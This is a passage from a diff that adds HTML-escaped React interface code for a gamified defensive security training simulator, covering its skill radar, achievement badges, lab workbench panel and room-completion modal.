+                            &lt;/div&gt;
+                          )}
+                        &lt;/div&gt;
+                      );
+                    })}
+                  &lt;/div&gt;
+
+                  &lt;div className=&quot;lg:col-span-7&quot;&gt;
+                    &lt;LabWorkbench
+                      room={activeRoom}
+                      progress={progress}
+                      onToggleContain={handleToggleContain}
+                      onAddSigmaRule={handleAddSigmaRule}
+                    /&gt;
+                  &lt;/div&gt;
+                &lt;/div&gt;
+              &lt;/div&gt;
+            )}
+
+            {view === 'skills' &amp;&amp; (
+              &lt;div className=&quot;space-y-6&quot;&gt;
+                &lt;div className=&quot;grid grid-cols-1 lg:grid-cols-12 gap-5&quot;&gt;
+                  &lt;div className=&quot;lg:col-span-5 rounded-xl bg-slate-900/80 border border-slate-800 p-5 flex flex-col items-center justify-between gap-4&quot;&gt;
+                    &lt;div className=&quot;text-center&quot;&gt;
+                      &lt;h2 className=&quot;text-base font-bold text-white&quot;&gt;5-Domain Defensive Skill Matrix&lt;/h2&gt;
+                      &lt;p className=&quot;text-xs text-slate-400&quot;&gt;
+                        Rank: &lt;span className={`font-semibold ${rankInfo.current.color}`}&gt;{rankInfo.current.name}&lt;/span&gt; • {progress.xp} XP
+                      &lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;SkillRadar skills={progress.skills} /&gt;
+                    &lt;div className=&quot;w-full space-y-2&quot;&gt;
+                      {SKILL_DOMAINS.map((d) =&gt; {
+                        const val = progress.skills[d.key] || 0;
+                        return (
+                          &lt;div key={d.key} className=&quot;space-y-1&quot;&gt;
+                            &lt;div className=&quot;flex justify-between text-xs&quot;&gt;
+                              &lt;span className=&quot;text-slate-300&quot;&gt;{d.label}&lt;/span&gt;
+                              &lt;span className=&quot;font-mono text-cyan-300&quot;&gt;{val}%&lt;/span&gt;
+                            &lt;/div&gt;
+                            &lt;div className=&quot;h-1.5 bg-slate-800 rounded-full overflow-hidden&quot;&gt;
+                              &lt;div className=&quot;h-full bg-cyan-400&quot; style={{ width: `${val}%` }} /&gt;
+                            &lt;/div&gt;
+                          &lt;/div&gt;
+                        );
+                      })}
+                    &lt;/div&gt;
+                  &lt;/div&gt;
+
+                  &lt;div className=&quot;lg:col-span-7 rounded-xl bg-slate-900/80 border border-slate-800 p-5 space-y-4&quot;&gt;
+                    &lt;div&gt;
+                      &lt;h2 className=&quot;text-base font-bold text-white&quot;&gt;Operator Badges&lt;/h2&gt;
+                      &lt;p className=&quot;text-xs text-slate-400&quot;&gt;
+                        Unlock badges by completing rooms and solving lab challenges.
+                      &lt;/p&gt;
+                    &lt;/div&gt;
+                    &lt;div className=&quot;grid grid-cols-1 sm:grid-cols-2 gap-3&quot;&gt;
+                      {BADGES.map((b) =&gt; {
+                        const unlocked = b.rule(progress);
+                        return (
+                          &lt;div
+                            key={b.id}
+                            className={`p-3.5 rounded-xl border flex items-start gap-3 ${
+                              unlocked
+                                ? 'bg-slate-950/90 border-cyan-500/35 text-slate-100'
+                                : 'bg-slate-950/40 border-slate-800/80 text-slate-500 opacity-75'
+                            }`}
+                          &gt;
+                            &lt;div
+                              className={`w-9 h-9 rounded-lg flex items-center justify-center shrink-0 ${
+                                unlocked
+                                  ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-500/30'
+                                  : 'bg-slate-900 text-slate-600 border border-slate-800'
+                              }`}
+                            &gt;
+                              {renderBadgeIcon(b.icon, 'w-4 h-4')}
+                            &lt;/div&gt;
+                            &lt;div&gt;
+                              &lt;div className=&quot;text-xs font-bold flex items-center gap-1.5&quot;&gt;
+                                &lt;span&gt;{b.title}&lt;/span&gt;
+                                {unlocked &amp;&amp; (
+                                  &lt;span className=&quot;text-[10px] px-1.5 py-0.5 rounded bg-emerald-500/15 text-emerald-300&quot;&gt;
+                                    Unlocked
+                                  &lt;/span&gt;
+                                )}
+                              &lt;/div&gt;
+                              &lt;p className=&quot;text-[11px] text-slate-400 mt-0.5&quot;&gt;{b.desc}&lt;/p&gt;
+                            &lt;/div&gt;
+                          &lt;/div&gt;
+                        );
+                      })}
+                    &lt;/div&gt;
+                  &lt;/div&gt;
+                &lt;/div&gt;
+              &lt;/div&gt;
+            )}
+          &lt;/main&gt;
+
+          {/* ROOM COMPLETION MODAL */}
+          {certificateRoom &amp;&amp; (
+            &lt;div className=&quot;fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4&quot;&gt;
+              &lt;div className=&quot;max-w-md w-full rounded-2xl bg-slate-900 border border-cyan-500/40 p-6 space-y-4 shadow-2xl&quot;&gt;
+                &lt;div className=&quot;flex items-center justify-between&quot;&gt;
+                  &lt;div className=&quot;inline-flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider&quot;&gt;
+                    &lt;Trophy className=&quot;w-4 h-4&quot; /&gt;
+                    Room Cleared
+                  &lt;/div&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setCertificateRoom(null)}
+                    className=&quot;p-1 rounded hover:bg-slate-800 text-slate-400&quot;
+                  &gt;
+                    &lt;X className=&quot;w-4 h-4&quot; /&gt;
+                  &lt;/button&gt;
+                &lt;/div&gt;
+
+                &lt;div&gt;
+                  &lt;h3 className=&quot;text-xl font-bold text-white&quot;&gt;{certificateRoom.title}&lt;/h3&gt;
+                  &lt;p className=&quot;text-xs text-slate-400 mt-1&quot;&gt;
+                    All {certificateRoom.tasks.length} tasks in &lt;span className=&quot;font-mono text-cyan-300&quot;&gt;{certificateRoom.id}&lt;/span&gt; completed.
+                  &lt;/p&gt;
+                &lt;/div&gt;
+
+                &lt;div className=&quot;p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-1.5 text-xs&quot;&gt;
+                  &lt;div className=&quot;flex justify-between&quot;&gt;
+                    &lt;span className=&quot;text-slate-400&quot;&gt;Operator Rank&lt;/span&gt;
+                    &lt;span className={`font-semibold ${rankInfo.current.color}`}&gt;{rankInfo.current.name}&lt;/span&gt;
+                  &lt;/div&gt;
+                  &lt;div className=&quot;flex justify-between&quot;&gt;
+                    &lt;span className=&quot;text-slate-400&quot;&gt;Total XP&lt;/span&gt;
+                    &lt;span className=&quot;font-mono text-cyan-300&quot;&gt;{progress.xp} XP&lt;/span&gt;
+                  &lt;/div&gt;
+                  &lt;div className=&quot;flex justify-between&quot;&gt;
+                    &lt;span className=&quot;text-slate-400&quot;&gt;MITRE Techniques&lt;/span&gt;
+                    &lt;span className=&quot;font-mono text-slate-200&quot;&gt;{certificateRoom.mitre.join(', ')}&lt;/span&gt;
+                  &lt;/div&gt;
+                &lt;/div&gt;
+
+                &lt;div className=&quot;flex justify-end gap-2&quot;&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setCertificateRoom(null)}
+                    className=&quot;px-4 py-2 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-xs transition&quot;
+                  &gt;
+                    Continue Training
+                  &lt;/button&gt;
+                &lt;/div&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+          )}
+        &lt;/div&gt;
+      );
+    }
+
+    const root = ReactDOM.createRoot(document.getElementById('root'));
+    root.render(&lt;CyberOpsSOCSimulator /&gt;);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</body>
+</html>
